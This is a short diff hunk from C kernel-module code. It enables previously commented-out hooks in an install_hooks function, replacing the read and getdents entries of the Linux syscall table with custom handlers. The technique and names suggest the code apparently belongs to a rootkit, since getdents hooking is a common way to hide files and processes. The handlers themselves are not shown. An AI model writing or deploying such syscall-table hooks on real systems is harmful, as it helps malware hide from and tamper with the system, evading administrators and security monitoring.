@@ -389,13 +389,13 @@ int install_hooks(void) {
 
     /** read
      */
-    //original_syscall_table[__NR_read] = syscall_table[__NR_read];
-    //syscall_table[__NR_read] = (long unsigned int)alpine_ksys_read;
+    original_syscall_table[__NR_read] = syscall_table[__NR_read];
+    syscall_table[__NR_read] = (long unsigned int)alpine_ksys_read;
 
     /** getdents
      */
-    //original_syscall_table[__NR_getdents] = syscall_table[__NR_getdents];
-    //syscall_table[__NR_getdents] = (long unsigned int)alpine_ksys_getdents;
+    original_syscall_table[__NR_getdents] = syscall_table[__NR_getdents];
+    syscall_table[__NR_getdents] = (long unsigned int)alpine_ksys_getdents;
 
     /** getdents64
      */
